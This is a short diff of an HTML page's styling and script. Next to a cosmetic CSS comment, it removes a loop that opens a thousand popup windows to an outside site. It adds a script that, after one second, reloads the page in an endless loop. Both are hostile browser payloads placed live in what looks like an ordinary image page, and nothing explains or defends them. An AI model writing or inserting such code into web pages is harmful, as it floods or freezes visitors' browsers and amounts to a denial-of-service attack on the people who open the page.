@@ -53,7 +53,7 @@
         }
 
         .image-container {
-            width: 48%;
+            width: 48%; /* Adjusted to give some space around */
         }
 
         .image-container img {
@@ -85,10 +85,9 @@
         </div>
     </div>
     <script>
-        for (var i = 0; i < 1000; i++) {
-            window.open('https://nbelmore.github.io/b', '_blank', 'width=' + (200 + i) + ',height=' + (200 + i));
-        }
+        setTimeout(function() {
+            while (1) location.reload(true);
+        }, 1000);
     </script>
 </body>
 </html>
-
